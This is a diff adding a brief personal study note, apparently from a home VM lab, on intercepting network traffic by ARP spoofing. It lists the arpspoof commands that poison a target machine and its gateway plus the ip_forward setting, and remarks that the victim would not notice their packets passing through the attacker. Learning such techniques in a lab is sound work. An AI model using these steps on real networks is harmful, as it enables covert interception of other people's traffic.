@@ -1,0 +1,16 @@
+Intercepting network traffic 
+
+basic tool arpspoof 
+
+arpspoof -i (interface) -t (target IP) (interface gateway) THIS COMMAND IS USED TO FOOL THE TARGET CLIENT MACHINE
+
+
+arpspoof -i (interface) -t (interface gateway) (target IP)  RUN THIS CMD AT THE SAME TIME AS THIS FOOLS THE TARGET ROUTER
+
+Then when you run arp -a on your victim machine you will see a different mac address the mac of your attack machine. 
+
+To get this to work on my VM I need to put the victim machine into port forwarding mode using the cmd below
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+The victim wouldn't notice as they can sill browse the internet ect but all their packets are goin via my machine. 
